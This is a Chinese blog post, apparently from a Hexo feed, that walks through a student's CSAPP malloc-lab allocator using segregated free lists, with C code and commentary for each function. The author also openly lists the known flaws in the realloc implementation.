title="extend_heap"></a>extend_heap</h1><p><code>static void *extend_heap(size_t size)</code><br>这个函数用来给堆扩展size大小的空间，要完成的功能如下所示</p><ol><li>首先调整size：<ol><li><code>#define ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)</code></li><li>这个宏就是实现了将size往最近的8的倍数舍入</li></ol></li><li>使用<code>mem_sbrk</code>申请size大小的空闲块</li><li>设置新得到的空闲块的的首部和尾部，以及重新设置堆的尾部<ol><li>新申请的空闲块的前一个4字节的小块就是之前堆的尾部，即长度为0，分配为为1的那个哥们。现在直接修改这个哥们，使其成为新申请的块的首部。</li></ol></li><li>将这个空闲块给放到空闲链表中去</li><li>尝试合并这个空闲块，因为原来堆的后面可能就是空闲的内存块<br>具体实现如下所示：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">extend_heap</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-comment">// word_count必须是偶数</span><br>  size = ALIGN(size);<br>  <span class="hljs-comment">// 使用mem_sbrk去申请空间</span><br>  <span class="hljs-type">void</span> *bp;<br>  <span class="hljs-keyword">if</span> ((bp = mem_sbrk(size)) == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  &#125;<br>  <span class="hljs-comment">// 将新申请的内存加到已有的堆上去</span><br>  <span class="hljs-comment">// 现在有个指针bp，它指向的新申请的内存的真正的起始位置</span><br>  <span class="hljs-comment">// 正常来说，这个bp的前一块就是之前堆的结尾块，是没用的，现在直接拿来做新申请的块的首部</span><br>  <span class="hljs-comment">// 然后又将新申请的块的最后一块变成堆的尾部</span><br>  PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>  PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>  PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));<br>  <span class="hljs-comment">// 将这个新的空闲块插入到我们的列表里</span><br>  insert_node(bp, size);<br>  <span class="hljs-keyword">return</span> coalesce(bp);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="insert-node"><a href="#insert-node" class="headerlink" title="insert_node"></a>insert_node</h1><p><code>static void insert_node(void *ptr, size_t size)</code><br>这个函数是将以ptr为bp指针的空闲块给塞到空闲块数组中去，bp指针指的是当前空闲块的有效载荷的第一个字节的地址，也就是头部+WSIZE</p><ol><li>首先找到这个size应该对应数组的哪个下标。（数组的每个下标存储的链表）</li><li>拿到这个下标对应的链表，根据size找到应该插入到这个链表的哪个位置（链表是从小大递增的）</li><li>分情况插入<ol><li>当前链表为空</li><li>在首部插入</li><li>在尾部插入</li><li>在链表中间插入<br>这里具体的实现上就用了一些书上没有的宏定义，有点晦涩，所以解释一下。</li></ol></li><li><code>SET_PTR</code><ol><li><code>#define SET_PTR(p, ptr) (*(unsigned int *)(p) = (unsigned int)(ptr))</code></li><li>将地址p看做指向一个无符号int型整数，即一个32位数的地址，然后将地址ptr看做是一个32位数，即将地址ptr放到地址p指向的位置。</li><li>那么以后<code>*(unsigned int *)(p)</code>就可以得到ptr。</li><li>这个操作是用来存储这个空闲块的pre和next指针用的。p要么是pre指针所在的地址，要么是next指针所在的地址。然后<code>*(unsigned int *)(p)</code>就可以得到pre指针或者next指针</li></ol></li><li><code>GET_PRE_PTR</code><ol><li><code>#define GET_PRE_PTR(ptr) ((void *)(ptr))</code></li><li>这个宏传入一个ptr，这个ptr往往就是一个空闲块的bp指针。通过这个宏，可以得到这个空闲块存储pre指针的位置。</li><li>其实这一波操作之后返回的就是ptr自己，因为说过了，调用这个宏时，ptr往往传入的就是bp，而bp恰好就是空闲块中指向pre指针的指针。</li><li>之所以要做这种脱裤子放屁的事情，一个是为了使用起来更加清晰没有歧义，另一方面是为了和<code>GET_SUCC_PTR</code>的使用统一起来</li><li><code>#define GET_SUCC_PTR(ptr) ((void *)(ptr) + WSIZE)</code>就获得了指向next指针的指针</li></ol></li><li><code>GET_PRE</code><ol><li><code>#define GET_PRE(ptr) (*(void **)(GET_PRE_PTR(ptr)))</code></li><li>这个宏传入一个ptr，这个ptr其实往往就是某个空闲块的bp指针，然后返回这个空闲块存储的pre指针。</li><li>注意了<code>GET_PRE_PTR</code>实际上是指向pre指针的指针，但是呢，因为我们前面的定义中返回的<code>void*</code>，因此，我们需要先将它强制转为<code>void**</code>类型，即指向指针的指针。然后再通过<code>*</code>操作取出来pre空闲块真正的地址。</li><li><code>#define GET_SUCC(ptr) (*(void **)(GET_SUCC_PTR(ptr)))</code>就是取得真正的succ指针<br>这玩意是有点恶心的，对照着下面的代码看，应该就明白了<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">insert_node</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-comment">// 首先找到这个size应该在哪个格子里</span><br>  <span class="hljs-type">int</span> pos = find_pos(size);<br>  <span class="hljs-comment">// 扫描这个格子里存的链表，找到应该插入的位置</span><br>  <span class="hljs-type">void</span> *pre_ptr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">void</span> *cur_ptr = segregated_free_lists[pos];<br>  <span class="hljs-keyword">while</span> (cur_ptr != <span class="hljs-literal">NULL</span> &amp;&amp; size &gt; GET_SIZE(HDRP(cur_ptr))) &#123;<br>    pre_ptr = cur_ptr;<br>    cur_ptr = GET_SUCC(cur_ptr);<br>  &#125;<br>  <span class="hljs-comment">// 分情况讨论，正常来说，我们应该插入pre_ptr和cur_ptr之间</span><br>  <span class="hljs-comment">// 前驱比自己小，后续比自己大</span><br>  <span class="hljs-comment">// 如果pre_ptr为空</span><br>  <span class="hljs-keyword">if</span> (pre_ptr == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-comment">// 如果cur_ptr也为空，说明这个链表就是空的，直接插入即可</span><br>    <span class="hljs-keyword">if</span> (cur_ptr == <span class="hljs-literal">NULL</span>) &#123;<br>      segregated_free_lists[pos] = ptr;<br>      SET_PTR(GET_PRE_PTR(ptr), <span class="hljs-literal">NULL</span>);<br>      SET_PTR(GET_SUCC_PTR(ptr), <span class="hljs-literal">NULL</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// cur_ptr不为空，说明要插入的是第一个位置</span><br>      segregated_free_lists[pos] = ptr;<br>      SET_PTR(GET_PRE_PTR(cur_ptr), ptr);<br>      SET_PTR(GET_SUCC_PTR(ptr), cur_ptr);<br>      SET_PTR(GET_PRE_PTR(ptr), <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-comment">// pre_ptr不为空</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果cur_ptr为空，说明是在链表尾部插入</span><br>    <span class="hljs-keyword">if</span> (cur_ptr == <span class="hljs-literal">NULL</span>) &#123;<br>      SET_PTR(GET_SUCC_PTR(pre_ptr), ptr);<br>      SET_PTR(GET_PRE_PTR(ptr), pre_ptr);<br>      SET_PTR(GET_SUCC_PTR(ptr), <span class="hljs-literal">NULL</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 如果cur_ptr不为空，说明是在链表中间插入</span><br>      SET_PTR(GET_SUCC_PTR(pre_ptr), ptr);<br>      SET_PTR(GET_PRE_PTR(ptr), pre_ptr);<br>      SET_PTR(GET_SUCC_PTR(ptr), cur_ptr);<br>      SET_PTR(GET_PRE_PTR(cur_ptr), ptr);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h1><p><code>static void *coalesce(void *bp)</code></p><ol><li>这个函数的作用是将bp指向的空闲块和前后的空闲块合并，但是前后的空闲块也不一定存在，所以要分类讨论</li><li>这个函数返回合并之后的空闲块的起始地址，这个起始地址只会在前面存在空闲块的情况下返回前面空闲块的起始地址，否则就是返回当前的bp<br>具体实现思路</li><li>首先分别获取前面和后面的内存块是否被分配（地址意义上的前后内存块，而不是空闲内存块那个意义上的）</li><li>分类讨论，该合并合并，如果需要合并<ol><li>先将参与合并的空闲内存块在空闲内存数组中给删了</li><li>然后设置合并之后的空闲内存块的首部和尾部</li><li>最后给它加入到空闲内存数组中去<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">coalesce</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span> &#123;<br>  <span class="hljs-comment">// 首先获取前后内存块的状态</span><br>  <span class="hljs-type">int</span> is_pre_alloc = GET_ALLOC(HDRP(PREV_BLKP(bp)));<br>  <span class="hljs-type">int</span> pre_size = GET_SIZE(HDRP(PREV_BLKP(bp)));<br>  <span class="hljs-type">int</span> is_next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));<br>  <span class="hljs-type">int</span> next_size = GET_SIZE(HDRP(NEXT_BLKP(bp)));<br>  <span class="hljs-type">int</span> cur_size = GET_SIZE(HDRP(bp));<br>  <span class="hljs-comment">// 根据状态分类讨论</span><br>  <span class="hljs-type">int</span> new_size;<br>  <span class="hljs-comment">// 前后均分配了</span><br>  <span class="hljs-keyword">if</span> (is_pre_alloc &amp;&amp; is_next_alloc) &#123;<br>    <span class="hljs-keyword">return</span> bp;<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_pre_alloc &amp;&amp; !is_next_alloc) &#123;<br>    <span class="hljs-comment">// 前面分配了，后面没分配，所以和后面合并</span><br>    <span class="hljs-comment">// 首先，在空闲块数组中删除这两个块</span><br>    delete_node(bp);<br>    delete_node(NEXT_BLKP(bp));<br>    <span class="hljs-comment">// 然后修改首部和尾部</span><br>    new_size = cur_size + next_size;<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!is_pre_alloc &amp;&amp; is_next_alloc) &#123;<br>    delete_node(bp);<br>    delete_node(PREV_BLKP(bp));<br>    new_size = pre_size + cur_size;<br>    <span class="hljs-comment">// 修改当前的bp，因为和前面合并了，现在的bp应该指向前面的块的头部</span><br>    bp = PREV_BLKP(bp);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 前后都是空的</span><br>    delete_node(bp);<br>    delete_node(PREV_BLKP(bp));<br>    delete_node(NEXT_BLKP(bp));<br>    new_size = pre_size + cur_size + next_size;<br>    bp = PREV_BLKP(bp);<br>  &#125;<br>  <span class="hljs-comment">// 修改当前合并后的空闲块的首部和尾部</span><br>  PUT(HDRP(bp), PACK(new_size, <span class="hljs-number">0</span>));<br>  <span class="hljs-comment">// 只要设置好了头部，那么尾部就可以直接操作</span><br>  PUT(FTRP(bp), PACK(new_size, <span class="hljs-number">0</span>));<br>  <span class="hljs-comment">// 将这个空闲块插入空闲块数组</span><br>  insert_node(bp, new_size);<br>  <span class="hljs-keyword">return</span> bp;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h1><p><code>void *mm_malloc(size_t size)</code></p><ol><li>这个函数是分配一个size大小的内存块，并返回这个内存块的bp指针<br>实现思路</li><li>首先要特判size不合法的情况，小于等于0</li><li>然后要调整size<ol><li>如果size不足最小块的要求，将size变为最小快的长度。最小快应该是<code>2*DSIZE</code></li><li>如果size不为8的倍数，修改为8个倍数。之所以要修改为8个倍数，是为了对齐的要求。对齐是为了取内存数据的时候，一次可以成功取出来，避免出现一个数据存在于两个cache行的情况</li></ol></li><li>根据size去空闲内存数组中去找是否有合适的内存块。可能size对应的那个链表中找不到，那就去索引更大的链表中找</li><li>如果实在找不到，那就要申请扩展堆</li><li>最后修改找到的空闲块（这一步通过<code>place</code>操作完成）<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-comment">// 首先调整size为合法值，最小为2*DSIZE，否则一定要是8的倍数</span><br>  <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (size &lt;= DSIZE) &#123;<br>    size = <span class="hljs-number">2</span> * DSIZE;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    size = ALIGN(size + DSIZE);<br>  &#125;<br>  <span class="hljs-comment">// 根据size去空闲块数组里找最合适的那个</span><br>  <span class="hljs-type">int</span> pos = find_pos(size);<br>  <span class="hljs-type">void</span> *fit_ptr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">while</span> (pos &lt; LIST_MAX_SIZE) &#123;<br>    <span class="hljs-comment">// 去当前项里面找</span><br>    <span class="hljs-type">void</span> *cur_ptr = segregated_free_lists[pos];<br>    <span class="hljs-keyword">while</span> (cur_ptr != <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">if</span> (GET_SIZE(HDRP(cur_ptr)) &lt; size) &#123;<br>        cur_ptr = GET_SUCC(cur_ptr);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        fit_ptr = cur_ptr;<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fit_ptr != <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    pos++;<br>  &#125;<br>  <span class="hljs-comment">// 如果没有足够大的，说明堆要扩充空间了</span><br>  <span class="hljs-keyword">if</span> (fit_ptr == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">if</span> ((fit_ptr = extend_heap(MAX(size, CHUNKSIZE))) == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// 在该空闲块中分配size大小的块</span><br>  fit_ptr = place(fit_ptr, size);<br>  <span class="hljs-keyword">return</span> fit_ptr;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="place"><a href="#place" class="headerlink" title="place"></a>place</h1><p><code>static void *place(void *bp, size_t size)</code></p><ol><li>这个函数是将bp所指向的内存块分配size大小的内存走，即留下原大小减去size大小的内存块</li><li>这里用了一个很神奇的优化方法。不是一直把这个空闲块的前size个字节给分配掉，而是根据size的大小讨论，如果比较小就分配前size个字节，如果比较大就分配后size个字节。之所以这样优化，是为了避免一些极端情况下出现很多外部内存碎片</li><li>分配的操作的实现其实是通过设置首部和尾部实现的，分别设置前部和后部的首尾部，就完成了分配的操作，然后将新生成的小空闲内存块给加入到空闲内存数组中去<br>实现思路</li><li>如果剩下的空闲块不足一个最小空闲块，那就直接全部分配</li><li>如果size比较大，分配后size个字节，这个比较大是一个经验值，选一个效果比较好就行了</li><li>如果size比较小，分配前size个字节<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">place</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp, <span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-comment">// 在bp中分配size大小的空闲块走</span><br>  <span class="hljs-comment">// 先在数组中删除bp空闲块</span><br>  delete_node(bp);<br>  <span class="hljs-comment">// 获得bp块的长度</span><br>  <span class="hljs-type">size_t</span> free_size = GET_SIZE(HDRP(bp));<br>  <span class="hljs-comment">// 如果剩下的小于2*DSIZE，那就不用再插入回去了</span><br>  <span class="hljs-keyword">if</span> (free_size - size &lt; <span class="hljs-number">2</span> * DSIZE) &#123;<br>    PUT(HDRP(bp), PACK(free_size, <span class="hljs-number">1</span>));<br>    PUT(FTRP(bp), PACK(free_size, <span class="hljs-number">1</span>));<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (size &gt;= <span class="hljs-number">96</span>) &#123;<br>    PUT(HDRP(bp), PACK(free_size - size, <span class="hljs-number">0</span>));<br>    PUT(FTRP(bp), PACK(free_size - size, <span class="hljs-number">0</span>));<br>    insert_node(bp, free_size - size);<br>    bp = NEXT_BLKP(bp);<br>    PUT(HDRP(bp), PACK(size, <span class="hljs-number">1</span>));<br>    PUT(FTRP(bp), PACK(size, <span class="hljs-number">1</span>));<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 注意，这里是把前半部分给分配了，不能修改bp，最后还是要返回bp</span><br>    <span class="hljs-comment">// 前半部分要分配，后半部分重新插入</span><br>    PUT(HDRP(bp), PACK(size, <span class="hljs-number">1</span>));<br>    PUT(FTRP(bp), PACK(size, <span class="hljs-number">1</span>));<br>    <span class="hljs-comment">// 修改bp指向后半段</span><br>    PUT(HDRP(NEXT_BLKP(bp)), PACK(free_size - size, <span class="hljs-number">0</span>));<br>    PUT(FTRP(NEXT_BLKP(bp)), PACK(free_size - size, <span class="hljs-number">0</span>));<br>    <span class="hljs-comment">// 重新放入空闲块数组</span><br>    insert_node(NEXT_BLKP(bp), free_size - size);<br>  &#125;<br>  <span class="hljs-keyword">return</span> bp;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="free"><a href="#free" class="headerlink" title="free"></a>free</h1><p><code>void mm_free(void *ptr)</code></p><ol><li>这个函数是将ptr指向的空闲内存块给free掉<br>实现思路</li><li>首先设置首尾部，将其alloc的状态改为0</li><li>然后加入空闲块链表</li><li>最后尝试空闲块的合并<br>其实到这里就可以发现，设置一个块就只需要修改首部和尾部，空闲块再丢入空闲块数组并尝试合并即可<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">mm_free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span> &#123;<br>  <span class="hljs-comment">// 修改标志位</span><br>  <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(ptr));<br>  PUT(HDRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>  PUT(FTRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>  <span class="hljs-comment">// 插入空闲列表</span><br>  insert_node(ptr, size);<br>  <span class="hljs-comment">// 尝试合并</span><br>  coalesce(ptr);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h1><p><code>void *mm_realloc(void *ptr, size_t size)</code></p><ol><li>这个函数是将ptr指向的块给扩展为size大小</li><li>这里有个优化的思路就是能不copy就尽量不copy，因为如果要copy那就会引起复制以及free当前块。所以最好能和后面的内存块合并。<br>实现思路</li><li>首先需要处理size非法的情况<ol><li>为0啊</li><li>不足最小块的大小的要求啊</li><li>向8对齐啊</li></ol></li><li>如果size小于当前空闲块大小，则直接忽略</li><li>如果这个块是堆的尾部，那么可以试着去扩展堆，这样可以减少copy的操作，但是这个优化可有可无吧只能说</li><li>如果这个块后面是一个空闲块，可以将这个空闲块并入当前块，看看是否可以满足要求，如果可以的话就合并，然后返回答案</li><li>如果上面都不行，那就只能重新malloc然后memcpy，再free掉当前内存块了<br>写博客的时候才发现我下面的实现有几个问题</li><li>扩展堆尾部以及和后面的块合并的时候，如果成功了，那是不是给这个块扩的太多了？超过了它需要的size的要求</li><li>我依稀记得实验文档好像要求可以实现缩小，即size是可以小于当前空闲块大小的，但是我这里是直接忽略了</li><li>上面两个问题好像不对导致结果错误，但是会牺牲空间，并且第2点会带来一点安全隐患，因为我并没有真正的缩小块，用户依然可以访问。只能希望用户在realloc之后，就按他想要的size来操作这个内存块了。</li><li>但是太懒了，不想实现了。<br>代码实现<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-comment">// 首先检查size的合法性</span><br>  <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  &#125;<br>  <span class="hljs-comment">// 修改size使其对齐</span><br>  <span class="hljs-keyword">if</span> (size &lt;= DSIZE) &#123;<br>    size = <span class="hljs-number">2</span> * DSIZE;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    size = ALIGN(size + DSIZE);<br>  &#125;<br>  <span class="hljs-comment">// 计算当前块的大小与要求的size的差值</span><br>  <span class="hljs-type">int</span> cur_size = GET_SIZE(HDRP(ptr));<br>  <span class="hljs-type">int</span> change_size = cur_size - size;<br>  <span class="hljs-comment">// 如果size小于等于当前长度，则不需要重新分配</span><br>  <span class="hljs-keyword">if</span> (change_size &gt;= <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> ptr;<br>  &#125;<br>  <span class="hljs-comment">// 如果当前块后面就是结尾</span><br>  <span class="hljs-keyword">if</span> (GET_SIZE(HDRP(NEXT_BLKP(ptr))) == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// 扩展</span><br>    <span class="hljs-keyword">if</span> (extend_heap(MAX(change_size, CHUNKSIZE)) == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-comment">// 扩展成功，修改头尾部</span><br>    delete_node(NEXT_BLKP(ptr));<br>    PUT(HDRP(ptr), PACK(cur_size + MAX(change_size, CHUNKSIZE), <span class="hljs-number">1</span>));<br>    PUT(FTRP(ptr), PACK(cur_size + MAX(change_size, CHUNKSIZE), <span class="hljs-number">1</span>));<br>    <span class="hljs-keyword">return</span> ptr;<br>  &#125;<br>  <span class="hljs-comment">// 如果当前块后面有个free块，尝试去合并，看看是不是可以</span><br>  <span class="hljs-keyword">if</span> (!GET_ALLOC(HDRP(NEXT_BLKP(ptr)))) &#123;<br>    <span class="hljs-comment">// 如果加起来长度够的话</span><br>    <span class="hljs-type">int</span> next_size = GET_SIZE(HDRP(NEXT_BLKP(ptr)));<br>    <span class="hljs-keyword">if</span> (cur_size + next_size &gt;= size) &#123;<br>      delete_node(NEXT_BLKP(ptr));<br>      PUT(HDRP(ptr), PACK(cur_size + next_size, <span class="hljs-number">1</span>));<br>      PUT(FTRP(ptr), PACK(cur_size + next_size, <span class="hljs-number">1</span>));<br>      <span class="hljs-keyword">return</span> ptr;<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// 最后一步了，只能去重新申请</span><br>  <span class="hljs-type">void</span> *new_ptr = mm_malloc(size);<br>  <span class="hljs-built_in">memcpy</span>(new_ptr, ptr, cur_size);<br>  mm_free(ptr);<br>  <span class="hljs-keyword">return</span> new_ptr;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="出现的错误"><a href="#出现的错误" class="headerlink" title="出现的错误"></a>出现的错误</h1><ol><li>死循环：忘记给pos++</li><li>段错误：place的时候，没有正确返回bp指针</li><li>不知名错误：在realocate的时候，在尾部重新申请位置的情况下，忘记把新申请的从空闲块里删除了</li></ol>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab5</title>
    <link href="/2023/08/03/csapp-lab5/"/>
    <url>/2023/08/03/csapp-lab5/</url>
    
